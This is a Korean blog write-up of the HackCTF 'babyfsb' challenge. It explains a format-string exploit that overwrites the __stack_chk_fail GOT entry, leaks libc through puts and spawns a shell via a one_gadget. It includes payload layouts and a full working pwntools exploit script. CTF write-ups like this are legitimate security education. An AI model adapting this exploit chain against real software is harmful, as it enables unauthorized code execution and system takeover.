---
layout: post
title:  "HacCTF babyfsb write-up"
date:   2020-03-20 19:45:55
image:  hackctf_babyfsb.PNG
tags:   [HackCTF]
categories: [Write-up]
---


### 1.  문제

---

**1) mitigation 확인**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20babyfsb/Untitled.png)

PIE는 걸려있지 않지만 이번에는 카나리가 걸려있다.

<br>

**2) 문제 확인**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20babyfsb/Untitled%201.png)

hello 라는 문자열이 출력되고 입력할수 있는 공간이 나온다. 그 뒤 입력한 문자열이 출력되고 바로 종료가 된다.

<br>

**3) 코드흐름 파악**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20babyfsb/Untitled%202.png)

read로 0x40 만큼 입력을 받는다. ret 을 덮을 수 없는 사이즈이다.

10라인에서 printf 를 이용해 fsb가 가능할 것으로 보인다.


<br><br>


### 2. 접근방법

---

일반적으로 fsb를 이용하면 " % $ n 등등.." 이러한 서식문자를 이용하여 특정함수의 got를 덮고, 원하는 got_overwrite를 이용하여 원하는 동작을 일으키는 식으로 문제를 풀었었다.

64bit 환경이기 때문에 %p 5개를 입력하고 그다음 서식문자부터 rsp의 값들을 leak할수 있다. 한번 상황을 봐보자.

 

- printf (" %p %p %p %p %p %p %p %p")

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20babyfsb/Untitled%203.png)
        
        ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20babyfsb/Untitled%204.png)
        
        0x7fffffffdcc0 이 현재 ret주소를 담고있는 주소이다. 여기 ret주소를 가리키고 있는 부분이 없기 때문에 곧바로 ret 값을 변경할 수 없다. 또한 만약 어찌해서 특정 함수의 got를 덮었다고 해도 printf 함수다음 return 0 이 나오기 때문에 해당 함수를 실행시킬수 없다.

    하지만 !! 문제를 잘 보면 현재 카나리가 걸려있다. 따라서 카나리를 체크하는 함수가 어셈블리로 보면 확인가능하다.
    
             0x0000000000400711 <+107>:	mov    rcx,QWORD PTR [rbp-0x8]
           0x0000000000400715 <+111>:	xor    rcx,QWORD PTR fs:0x28
           0x000000000040071e <+120>:	je     0x400725 <main+127>
           0x0000000000400720 <+122>:	call   0x400550 <__stack_chk_fail@plt>
           0x0000000000400725 <+127>:	leave  
           0x0000000000400726 <+128>:	ret
    
    카나리 값은 rbp-0x8에 위치해 있는데, 이는 read함수로  덮을수 있다. 해당 값이 변조되면 stack_chk_fail 함수가 호출된다. 따라서 해당 함수의 got를 덮으면 된다 !

<br>

- **libc 주소 leak 시나리오**
    1. stack_chk_fail 함수의 got를 " pop rdi; ret " 가젯 주소로 덮는다.
    2. 일부로 카나리를 변조하여 해당 함수가 실행되게끔 한다.
    3. stack_chk_fail 함수가 실행되면 현재 got에 pop rdi; ret 주소로 덮혀져 있기 때문에 가젯 주소로 간다
    4. puts의 주소를 leak해야하기위해 rdi에 puts_got를 넣고 puts_plt를 넣는다.
    5. payload = %(pop rdi;ret 주소 10진수값)c %8 $ln +"AA" // align을 위해 AA두개를 넣음

        payload += stack_chk_fail_got 주소

        payload += puts_got 주소

        payload += puts_plt 주소

        payload += "B"*( 0x40 * len(payload) )  // 카나리 변조에러를 일으키기 위해

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20babyfsb/Untitled%205.png)

<br>

   위 상황은 현재 위 시나리오의 페이로드를 보내고나서, stack_chk_fail 함수가 호출된 상태이다.

원하는대로 해당 함수의 got가 덮혀져 가젯 주소로 ret되었다. 근데, 여기서 stack을 보면 약간 이상하다. 원래대로라면 rdi에 put_got가 들어가야하는데, 현재 스택 최상단에 0x400725가 들어가있어 이 값이 rdi에 들어간다.

원하는 값인 0x601018은 스택에서 5번째에 위치해 있는 것을 볼수 있다. 따라서 위 시나리오의 페이로드를 전송하면 에러가 난다. 우리는 pop rdi ; ret 가젯을 이용하기 전에 스택을 먼저 맞추기 위해 pop pop pop pop ret; 가젯을 먼저 호출해야한다.

그래야 4번의 pop이 일어나고 우리가 넣은 값을 이용할 수 있다. 정리하면 ppppr 가젯으로 got를 덮고 그다음 pop rdi; ret를 넣은뒤 그 뒤에 put_got, put_plt를 넣어주면 된다.

<br>

**페이로드 수정 !**

- payload = %(pop pop pop pop ; ret; 주소 10진수값)c %8 $ln +"AA"

    payload += stack_chk_fail_got 주소

    payload += pop rdi; ret 주소

    payload += puts_got 주소

    payload += puts_plt 주소

    payload += "B"*( 0x40 * len(payload) )  // 카나리 변조에러를 일으키기 위해

    payload += main 주소

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20babyfsb/Untitled%206.png)

<br>

수정된 페이로드로 디버깅을 했을때 stack_chk_fail 함수가 실행되어 ppppr 주소로 돌아갔고, ret가 실행되면 pop rdi; ret 주소로 가는 것을 확인할 수 있다. 그 이후 0x601018을 rdi에 제대로 저장할 것이다.

이렇게 하면 puts의 주소를 leak할 수 있고, 이를 이용하여 libc_base 주소를 구할 수 있다.

그다음은 다시 main으로 돌아가서 stack_chk_fail got를 one gadget주소로 덮으면 끝이다



<br><br>

### 3. 풀이

---

최종 익스코드는 다음과 같다
```python
from pwn import *
context.log_level="DEBUG"
#p=remote("ctf.j0n9hyun.xyz", 3032)
env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc.so.6")}
p=process("./babyfsb",env=env)
e=ELF("./babyfsb")
libc=ELF("./libc.so.6")

one_shot_off=0x45216

gdb.attach(p)
p.recvuntil("hello\n")
pause()
payload = "%4196236c%8$ln"+"AA"+p64(0x601020)+p64(0x400793)+p64(e.got['puts'])+p64(e.plt['puts'])
payload += p64(0x4006A6) # main
payload += "C"*(0x40-len(payload))
p.send(payload)

put_addr=u64(p.recvuntil("hello\n")[-13:-7]+"\x00\x00")
libc_base=put_addr-libc.symbols['puts']
log.info(hex(libc_base))
log.info(hex(libc_base+one_shot_off))
pause()
payload2 = "%4196236c%8$ln"+"AA" + p64(0x601020)+p64(libc_base+one_shot_off)
payload2 += "C"*(0x40-len(payload2))
p.send(payload2) 
p.interactive()
```


<br><br>

### 4. 몰랐던 개념

---

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20babyfsb/Untitled%207.png)

원샷 가젯을 실행시키면 위와 같이 4개의 one gadget offset 주소를 확인 할 수 있는데, 해당 문제에서는 맨 위의 오프셋만 정상적으로 동작하고 나머지 3개는 에러를 뿜는다.

나머지 3개가 에러를 뿜는 이유를 첨에는 몰랐는데 2번째 인자에 execve를 이용하여 쉘을 얻으려면 2,3번째 인자가 널이여야한다. 따라서 rsp+0x30, rsp+0x50, rsp+0x70 이 3개는 해당 one gadget이 호출되었을때 널이 아니여서 execve가 제대로 동작하지 않은 것이다.

첫번째 offset이 실행되기 위해서는 rax=NULL 이여야하는데 내부적으로 해당 조건이 만족되는것 같다